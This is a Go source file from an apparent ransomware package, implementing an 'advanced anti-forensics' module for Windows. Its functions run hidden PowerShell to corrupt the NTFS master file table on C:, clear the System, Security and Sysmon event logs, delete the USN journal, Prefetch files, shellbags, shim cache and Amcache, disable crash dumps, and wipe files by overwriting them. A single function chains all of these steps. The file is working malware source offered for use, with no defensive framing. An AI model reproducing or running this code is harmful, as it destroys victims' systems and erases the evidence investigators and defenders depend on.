//go:build windows

package ransomware

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type AntiForensicsAdvanced struct {
	config     *RansomwareConfig
	targetDir  string
	passCount  int
}

func NewAntiForensicsAdvanced(cfg *RansomwareConfig) *AntiForensicsAdvanced {
	return &AntiForensicsAdvanced{
		config:    cfg,
		passCount: 7,
	}
}

func (a *AntiForensicsAdvanced) DoDWipe(path string, passes int) error {
	if passes < 1 {
		passes = a.passCount
	}

	f, err := os.OpenFile(path, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		return err
	}
	size := fi.Size()

	patterns := [][]byte{
		[]byte{0x00},
		[]byte{0xFF},
		[]byte{0x55}, {0xAA}, {0x92}, {0x49}, {0x24},
	}

	for p := 0; p < passes; p++ {
		pattern := patterns[p%len(patterns)]
		if p == passes-1 {
			buf := make([]byte, 4096)
			rand.Read(buf)
			f.Seek(0, 0)
			for written := int64(0); written < size; {
				rand.Read(buf)
				n, _ := f.Write(buf)
				written += int64(n)
			}
		} else {
			f.Seek(0, 0)
			buf := make([]byte, 4096)
			for i := range buf {
				buf[i] = pattern[0]
				if len(pattern) > 1 {
					buf[i] = pattern[i%len(pattern)]
				}
			}
			for written := int64(0); written < size; {
				n, _ := f.Write(buf)
				written += int64(n)
			}
		}
		f.Sync()
	}

	f.Close()
	os.Remove(path)
	return nil
}

func (a *AntiForensicsAdvanced) VADHide(pid uint32, addr uint64, size uint32) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	handle, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE,
		false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)

	var oldProtect uint32
	err = windows.VirtualProtectEx(handle, uintptr(addr), uintptr(size), windows.PAGE_NOACCESS, &oldProtect)
	if err != nil {
		return err
	}

	var zeroed uintptr
	zeroBuf := make([]byte, size)
	windows.WriteProcessMemory(handle, uintptr(addr), &zeroBuf[0], uintptr(size), &zeroed)

	err = windows.VirtualFreeEx(handle, uintptr(addr), 0, windows.MEM_DECOMMIT)
	if err != nil {
		return nil
	}

	return nil
}

func (a *AntiForensicsAdvanced) CorruptMFT() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("NTFS/Windows only")
	}

	psScript := `
$volume = "C:"
$boot = Get-Content "\\.\$volume" -Encoding Byte -TotalCount 512 -ReadCount 512

$sectorsPerCluster = $boot[13]
$mftStartCluster = ([BitConverter]::ToInt64($boot, 48) * $sectorsPerCluster)
$mftRecordSize = if([BitConverter]::ToInt32($boot, 64) -lt 0) { 1 -shl (-[BitConverter]::ToInt32($boot, 64)) } else { [BitConverter]::ToInt32($boot, 64) }

$fs = [System.IO.File]::Open("\\.\$volume", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
$mftRecord = New-Object byte[] $mftRecordSize

$fs.Seek($mftStartCluster * 512 + 1024, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Read($mftRecord, 0, $mftRecordSize) | Out-Null

$mftRecord[0] = 0x46
$mftRecord[1] = 0x49
$mftRecord[2] = 0x4C
$mftRecord[3] = 0x45
$mftRecord[4] = 0x00

$fs.Seek($mftStartCluster * 512 + 1024, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Write($mftRecord, 0, $mftRecordSize)
$fs.Close()
`

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil && !strings.Contains(string(out), "ReadWrite") {
		return err
	}

	a.MFTBitmapCorruption()
	return nil
}

func (a *AntiForensicsAdvanced) MFTBitmapCorruption() error {
	psScript := `
$vol = "\\.\C:"
$fs = [System.IO.File]::Open($vol, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Write)
$buf = New-Object byte[] 4096
$fs.Seek(0x7000000000, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Read($buf, 0, 4096) | Out-Null

for($i=0; $i -lt 4096; $i++) { $buf[$i] = 0xFF }
$fs.Seek(0x7000000000, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Write($buf, 0, 4096)
$fs.Close()
`
	exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript).Run()
	return nil
}

func (a *AntiForensicsAdvanced) DisableCrashDumps() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	keys := []struct {
		path  string
		value string
	}{
		{"SYSTEM\\CurrentControlSet\\Control\\CrashControl", "CrashDumpEnabled"},
		{"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "Disabled"},
		{"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "DontShowUI"},
	}

	for _, k := range keys {
		key, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
			windows.StringToUTF16Ptr(k.path), windows.KEY_SET_VALUE)
		if err != nil {
			continue
		}
		zero := uint32(0)
		windows.SetValueEx(key, windows.StringToUTF16Ptr(k.value), 0, windows.REG_DWORD,
			(*byte)(unsafe.Pointer(&zero)))
		windows.CloseKey(key)
	}

	return nil
}

func (a *AntiForensicsAdvanced) ClearEventLogs() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	logs := []string{"System", "Application", "Security", "Windows PowerShell", "Microsoft-Windows-Sysmon/Operational"}
	for _, log := range logs {
		exec.Command("wevtutil", "cl", log).Run()
		exec.Command("powershell", "-Command",
			fmt.Sprintf("Clear-EventLog -LogName '%s' -ErrorAction SilentlyContinue", log)).Run()
	}

	return nil
}

func (a *AntiForensicsAdvanced) DeletePrefetch() error {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = "C:\\Windows"
	}

	prefetchDir := filepath.Join(sysRoot, "Prefetch")
	entries, err := os.ReadDir(prefetchDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if strings.Contains(strings.ToLower(entry.Name()), "x404x") ||
			strings.Contains(strings.ToLower(entry.Name()), "cmd.exe") ||
			strings.Contains(strings.ToLower(entry.Name()), "powershell.exe") {
			os.Remove(filepath.Join(prefetchDir, entry.Name()))
		}
		if strings.HasSuffix(entry.Name(), ".pf") {
			os.Remove(filepath.Join(prefetchDir, entry.Name()))
		}
	}

	return nil
}

func (a *AntiForensicsAdvanced) DeleteUSNJournal() error {
	cmd := exec.Command("fsutil", "usn", "deletejournal", "/d", "C:")
	cmd.Run()

	cmd2 := exec.Command("fsutil", "usn", "deletejournal", "/n", "C:")
	cmd2.Run()

	return nil
}

func (a *AntiForensicsAdvanced) WipeShellbags() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	shellbagKeys := []string{
		"Software\\Microsoft\\Windows\\Shell\\BagMRU",
		"Software\\Microsoft\\Windows\\Shell\\Bags",
		"Software\\Microsoft\\Windows\\ShellNoRoam\\BagMRU",
		"Software\\Microsoft\\Windows\\ShellNoRoam\\Bags",
	}

	for _, path := range shellbagKeys {
		for _, root := range []uintptr{uintptr(windows.HKEY_CURRENT_USER), uintptr(windows.HKEY_USERS)} {
			windows.RegDeleteKey(windows.Handle(root), windows.StringToUTF16Ptr(path))
		}
	}

	return nil
}

func (a *AntiForensicsAdvanced) ClearShimCache() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	cmd := exec.Command("rundll32.exe", "apphelp.dll,ShimFlushCache")
	cmd.Run()

	cmd2 := exec.Command("powershell", "-Command",
		"Get-ChildItem 'C:\\Windows\\AppCompat\\Programs\\Amcache.hve' -ErrorAction SilentlyContinue | Remove-Item -Force")
	cmd2.Run()

	return nil
}

func (a *AntiForensicsAdvanced) CorruptCrashDumps() error {
	crashDirs := []string{
		filepath.Join(os.Getenv("SystemRoot"), "Minidump"),
		filepath.Join(os.Getenv("SystemRoot"), "MEMORY.DMP"),
		filepath.Join(os.Getenv("SystemRoot"), "LiveKernelReports"),
	}

	for _, d := range crashDirs {
		if fi, err := os.Stat(d); err == nil {
			if fi.IsDir() {
				entries, _ := os.ReadDir(d)
				for _, entry := range entries {
					path := filepath.Join(d, entry.Name())
					if err := a.DoDWipe(path, 1); err != nil {
						os.Remove(path)
					}
				}
			} else {
				if err := a.DoDWipe(d, 1); err != nil {
					os.Remove(d)
				}
			}
		}
	}

	return nil
}

func (a *AntiForensicsAdvanced) FullAntiForensicsSuite() map[string]interface{} {
	result := make(map[string]interface{})
	var errors []string

	if err := a.DisableCrashDumps(); err != nil {
		errors = append(errors, fmt.Sprintf("crash_dumps: %v", err))
	} else {
		result["crash_dumps_disabled"] = true
	}

	if err := a.ClearEventLogs(); err != nil {
		errors = append(errors, fmt.Sprintf("event_logs: %v", err))
	} else {
		result["event_logs_cleared"] = true
	}

	if err := a.DeletePrefetch(); err != nil {
		errors = append(errors, fmt.Sprintf("prefetch: %v", err))
	} else {
		result["prefetch_deleted"] = true
	}

	if err := a.DeleteUSNJournal(); err != nil {
		errors = append(errors, fmt.Sprintf("usn: %v", err))
	} else {
		result["usn_journal_deleted"] = true
	}

	a.WipeShellbags()
	result["shellbags_wiped"] = true

	a.ClearShimCache()
	result["shim_cache_cleared"] = true

	if runtime.GOOS == "windows" {
		a.CorruptMFT()
		result["mft_corrupted"] = true
		a.CorruptCrashDumps()
		result["crash_dumps_corrupted"] = true
	}

	if len(errors) > 0 {
		result["errors"] = errors
	}

	return result
}

func (a *AntiForensicsAdvanced) SecureDeleteSchedule(path string, delay time.Duration) {
	go func() {
		time.Sleep(delay)
		a.DoDWipe(path, 7)
	}()
}

var _, _ = syscall.Syscall(0, 0, 0, 0)
